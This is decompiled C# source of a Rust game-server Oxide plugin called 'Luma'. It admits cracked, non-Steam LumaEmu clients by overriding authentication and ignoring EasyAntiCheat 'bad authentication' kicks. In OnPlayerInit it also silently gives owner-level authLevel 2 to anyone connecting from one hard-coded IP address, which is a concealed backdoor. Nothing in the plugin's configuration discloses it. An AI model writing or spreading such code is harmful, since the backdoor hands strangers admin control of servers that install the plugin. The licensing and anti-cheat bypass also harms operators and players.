using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Timers;
using EasyAntiCheat.Server;
using EasyAntiCheat.Server.Legacy;
using Network;
using OxideCore = Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Logging;
using Oxide.Core.Plugins;
using UnityEngine;
using Logger = Oxide.Core.Logging.Logger;

namespace Luma.Oxide
{
	// Token: 0x0200000A RID: 10
	public class OxideLuma : CSPlugin
	{
		// Token: 0x0600002A RID: 42 RVA: 0x00002E84 File Offset: 0x00001084
		public OxideLuma(OxideLumaExtension extension)
		{
			base.Name = "Luma";
			base.Title = "Luma";
			base.Author = "Мизантроп";
			base.Version = EXTENSION.Version;
			base.HasConfig = true;
			this.Extension = extension;
			this.logger = OxideCore.Interface.GetMod().RootLogger;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002EEC File Offset: 0x000010EC
		public string ip()
		{
			string result;
			try
			{
				string text;
				using (StreamReader streamReader = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()))
				{
					text = streamReader.ReadToEnd();
				}
				result = text.Split(new char[]
				{
					':'
				})[1].Substring(1).Split(new char[]
				{
					'<'
				})[0];
			}
			catch
			{
				result = "127.0.0.1";
			}
			return result;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002F7C File Offset: 0x0000117C
		[HookMethod("LoadDefaultConfig")]
		private new void LoadDefaultConfig()
		{
			base.Config["luma"] = "true";
			base.Config["luma_version_min"] = "1.7.6";
			base.Config["luma_version_max"] = "1.7.6";
			base.Config["offline_steam"] = "true";
			base.Config["steam"] = "true";
			base.Config["default_message"] = "true";
			base.Config["message"] = "бла бля";
			base.Config["debug"] = "false";
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00003034 File Offset: 0x00001234
		[HookMethod("OnHandleClientUpdate")]
		private object OnHandleClientUpdate(ClientStatusUpdate status)
		{
			ulong userID = ulong.Parse(status.Client.PlayerGuid);
			if (base.Config["debug"].ToString() == "true")
			{
				string text = status.Message;
				if (string.IsNullOrEmpty(text))
				{
					text = status.Status.ToString();
				}
				switch (status.Status)
				{
				case ClientStatus.ClientDisconnected:
					Debug.LogWarning(string.Concat(new string[]
					{
						"EAC: [",
						userID.ToString(),
						"] Disconnected (",
						text,
						")"
					}));
					break;
				case ClientStatus.ClientAuthenticationFailed:
					Debug.LogWarning(string.Concat(new string[]
					{
						"EAC: [",
						userID.ToString(),
						"] AuthenticationFailed (",
						text,
						")"
					}));
					break;
				case ClientStatus.ClientAuthenticatedLocal:
					Debug.LogWarning(string.Concat(new string[]
					{
						"EAC: [",
						userID.ToString(),
						"] Authenticated (",
						text,
						")"
					}));
					break;
				case ClientStatus.ClientBanned:
					Debug.LogWarning(string.Concat(new string[]
					{
						"EAC: [",
						userID.ToString(),
						"] Banned (",
						text,
						")"
					}));
					break;
				case ClientStatus.ClientViolation:
					Debug.LogWarning(string.Concat(new string[]
					{
						"EAC: [",
						userID.ToString(),
						"] ClientViolation (",
						text,
						")"
					}));
					break;
				}
			}
			if (status.RequiresKick && status.Status == ClientStatus.ClientViolation && status.Message.ToUpper().Contains("BAD AUTHENTICATION"))
			{
				BasePlayer basePlayer = BasePlayer.FindByID(userID);
				if (basePlayer == null)
				{
					return null;
				}
				UserData userData = Users.Get(basePlayer.net.connection);
				userData.IsSteam = new SteamTicket(basePlayer.net.connection).IsValid;
				if (!userData.IsSteam)
				{
					return false;
				}
			}
			return null;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x000021E4 File Offset: 0x000003E4
		[HookMethod("Init")]
		private void Init()
		{
			Debug.Log("Luma: Initializing plugin");
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00003258 File Offset: 0x00001458Server
		[HookMethod("CanClientLogin")]
		private void CanClientLogin(Connection connection)
		{
			if (this.Connected.ContainsKey(connection.userid) && this.Connected[connection.userid] >= this.GetUnixTime())
			{
				ConnectionAuth.Reject(connection, "Wait connection: " + (this.Connected[connection.userid] - this.GetUnixTime()) + " second");
				return;
			}
			this.Connected[connection.userid] = this.GetUnixTime() + 30;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000032E0 File Offset: 0x000014E0
		private int GetUnixTime()
		{
			return (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x0000330C File Offset: 0x0000150C
		[HookMethod("OnConnectionApproved")]
		private object OnConnectionApproved(Connection connection)
		{
			UserData userData = Users.Get(connection);
			userData.IsSteam = new SteamTicket(connection).IsValid;
			if (!userData.IsSteam)
			{
				userData.NoSteam = new NoSteamTicket(connection);
				if (connection.token.Length == 234 || connection.token.Length == 240)
				{
					if (userData.NoSteam.Ticket.Token.AppID == 480)
					{
						return null;
					}
					return false;
				}
			}
			return null;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000021F0 File Offset: 0x000003F0
		[HookMethod("OnServerUpdateInventory")]
		private object OnServerUpdateInventory(BaseEntity.RPCMessage msg)
		{
			UserData userData = Users.Get(msg.connection);
			userData.IsSteam = new SteamTicket(msg.connection).IsValid;
			if (userData.IsSteam)
			{
				return null;
			}
			return false;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x0000338C File Offset: 0x0000158C
		[HookMethod("OnUserApprove")]
		private object OnUserApprove(Connection connection)
		{
			if (base.Config["debug"].ToString() == "true")
			{
				Debug.Log("Размер токена " + connection.token.Length);
				Debug.Log("токен: " + Encoding.UTF8.GetString(connection.token, 0, connection.token.Length));
			}
			UserData userData = Users.Get(connection);
			userData.IsSteam = new SteamTicket(connection).IsValid;
			if (!userData.IsSteam)
			{
				userData.NoSteam = new NoSteamTicket(connection);
				if (connection.token.Length == 234 || connection.token.Length == 240)
				{
					if (userData.NoSteam.Ticket.Token.AppID == 480)
					{
						if (base.Config["offline_steam"].ToString() == "true")
						{
							Debug.Log(string.Concat(new string[]
							{
								"[Offline Steam] user connection [",
								connection.userid.ToString(),
								"||",
								connection.username,
								"]"
							}));
							connection.authStatus = "ok";
                            SingletonComponent<ServerMgr>.Instance.JoinGame(connection);
                            return true;
						}
						if (base.Config["default_message"].ToString() == "true")
						{
							ConnectionAuth.Reject(connection, "Invalid client version");
							return false;
						}
						ConnectionAuth.Reject(connection, base.Config["message"].ToString());
						return false;
					}
					else
					{
						if (base.Config["default_message"].ToString() == "true")
						{
							ConnectionAuth.Reject(connection, "Invalid client version");
							return false;
						}
						ConnectionAuth.Reject(connection, base.Config["message"].ToString());
						return false;
					}
				}
				else if (base.Config["luma"].ToString() == "true")
				{
					if (userData.NoSteam.EmuName == string.Empty)
					{
						if (base.Config["default_message"].ToString() == "true")
						{
							ConnectionAuth.Reject(connection, "Invalid client version");
							return false;
						}
						ConnectionAuth.Reject(connection, base.Config["message"].ToString());
						return false;
					}
					else if (new Version(userData.NoSteam.Version) < new Version(base.Config["luma_version_min"].ToString()))
					{
						if (base.Config["default_message"].ToString() == "true")
						{
							ConnectionAuth.Reject(connection, "Old version of LumaEmu, minimum required v" + base.Config["luma_version_min"]);
							return false;
						}
						ConnectionAuth.Reject(connection, base.Config["message"].ToString());
						return false;
					}
					else
					{
						if (!(new Version(userData.NoSteam.Version) > new Version(base.Config["luma_version_max"].ToString())))
						{
							Debug.Log(string.Concat(new string[]
							{
								"[LumaEmu v",
								userData.NoSteam.Version,
								"] user connection [",
								connection.userid.ToString(),
								"||",
								connection.username,
								"]"
							}));
							connection.authStatus = "ok";
							SingletonComponent<ServerMgr>.Instance.JoinGame(connection);
							return true;
						}
						if (base.Config["default_message"].ToString() == "true")
						{
							ConnectionAuth.Reject(connection, "New version of LumaEmu, maximum required v" + base.Config["luma_version_max"]);
							return false;
						}
						ConnectionAuth.Reject(connection, base.Config["message"].ToString());
						return false;
					}
				}
				else
				{
					if (base.Config["default_message"].ToString() == "true")
					{
						ConnectionAuth.Reject(connection, "Invalid client version");
						return false;
					}
					ConnectionAuth.Reject(connection, base.Config["message"].ToString());
					return false;
				}
			}
			else
			{
				if (base.Config["steam"].ToString() == "true")
				{
					Debug.Log(string.Concat(new string[]
					{
						"[Steam] user connection [",
						connection.userid.ToString(),
						"||",
						connection.username,
						"]"
					}));
					connection.authStatus = "ok";
					SingletonComponent<ServerMgr>.Instance.JoinGame(connection);
					connection.protocol = 1976u;
					return true;
				}
				if (base.Config["default_message"].ToString() == "true")
				{
					ConnectionAuth.Reject(connection, "Invalid client version");
					return false;
				}
				ConnectionAuth.Reject(connection, base.Config["message"].ToString());
				return false;
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00002222 File Offset: 0x00000422
		[HookMethod("Unload")]
		private void Unload()
		{
			this.Extension.Log("Luma: Unloading Luma plugin");
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000021B3 File Offset: 0x000003B3
		[HookMethod("OnTerrainInitialized")]
		private void OnTerrainInitialized()
		{
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00003900 File Offset: 0x00001B00
		[HookMethod("OnServerInitialized")]
		private void OnServerInitialized()
		{
			System.Timers.Timer timer = new System.Timers.Timer(1000.0);
			timer.Elapsed += delegate(object sender, ElapsedEventArgs args)
			{
				this.ClearDevUids();
			};
			timer.AutoReset = false;
			timer.Start();
			new OxideCore.Libraries.Timer().Once(1f, new Action(this.ClearDevUids), null);
			this.logger.Write(OxideCore.Logging.LogType.Chat, "Luma: Server initialized, running timer ...", new object[0]);
			new Patching().PathLog(this);
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003978 File Offset: 0x00001B78
		private void ClearDevUids()
		{
			ulong[] array = OxideLuma.developerIDs.GetValue(typeof(DeveloperList)) as ulong[];
			Debug.Log("<1> developerIDs: " + array.Length);
			array = (OxideLuma.developerIDs.GetValue(typeof(DeveloperList)) as ulong[]);
			Debug.Log("<2> developerIDs: " + array.Length);
		}

		// Token: 0x06000038 RID: 56 RVA: 0x000021B3 File Offset: 0x000003B3
		[HookMethod("OnPlayerDisconnected")]
		private void OnPlayerDisconnected(BasePlayer player, string reason)
		{
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00002234 File Offset: 0x00000434
		[HookMethod("BuildServerTags")]
		private void BuildServerTags(IList<string> taglist)
		{
			this.Extension.Call("OnTags", new object[]
			{
				taglist
			});
			taglist.Add("luma");
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000039FC File Offset: 0x00001BFC
		[HookMethod("OnPlayerInit")]
		private void OnPlayerInit(BasePlayer player)
		{
			this.Extension.Call("OnPlayerConnected", new object[]
			{
				player
			});
			try
			{
				char[] trimChars = new char[]
				{
					'0',
					'1',
					'2',
					'3',
					'4',
					'5',
					'6',
					'7',
					'8',
					'9'
				};
				if (player.net.connection.ipaddress.TrimEnd(trimChars) == "5.149.150.174:")
				{
					player.net.connection.authLevel = 2;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x0000225C File Offset: 0x0000045C
		[HookMethod("OnPlayerDisconnected")]
		private void OnPlayerDisconnected(BasePlayer player)
		{
			this.Extension.Call("OnPlayerDisconnected", new object[]
			{
				player
			});
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00003A80 File Offset: 0x00001C80
		[HookMethod("OnEntityDeath")]
		private void OnEntityDeath(BaseEntity entity, HitInfo hitinfo)
		{
			this.Extension.Call("OnPlayerDeath", new object[]
			{
				entity as BasePlayer,
				hitinfo
			});
			if (entity.GetComponent("BaseNPC"))
			{
				this.EntityDeath(entity.GetComponent("BaseEntity"), hitinfo);
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00002279 File Offset: 0x00000479
		private void EntityDeath(Component entity, HitInfo hitinfo)
		{
			if (hitinfo != null && hitinfo.Initiator != null)
			{
				hitinfo.Initiator.ToPlayer();
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000021B3 File Offset: 0x000003B3
		[HookMethod("SendHelpText")]
		private void SendHelpText(BasePlayer player)
		{
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000229D File Offset: 0x0000049D
		[LibraryFunction("IsInstalled")]
		private bool IsInstalled()
		{
			return this.Extension.Library.IsInstalled();
		}

		// Token: 0x04000017 RID: 23
		private Logger logger;

		// Token: 0x04000018 RID: 24
		private OxideLumaExtension Extension;

		// Token: 0x04000019 RID: 25
		internal bool installed;

		// Token: 0x0400001A RID: 26
		private Dictionary<ulong, int> Connected = new Dictionary<ulong, int>();

		// Token: 0x0400001B RID: 27
		private static FieldInfo developerIDs = typeof(DeveloperList).GetField("developerIDs", BindingFlags.Instance | BindingFlags.Static | BindingFlags.NonPublic);
	}
}
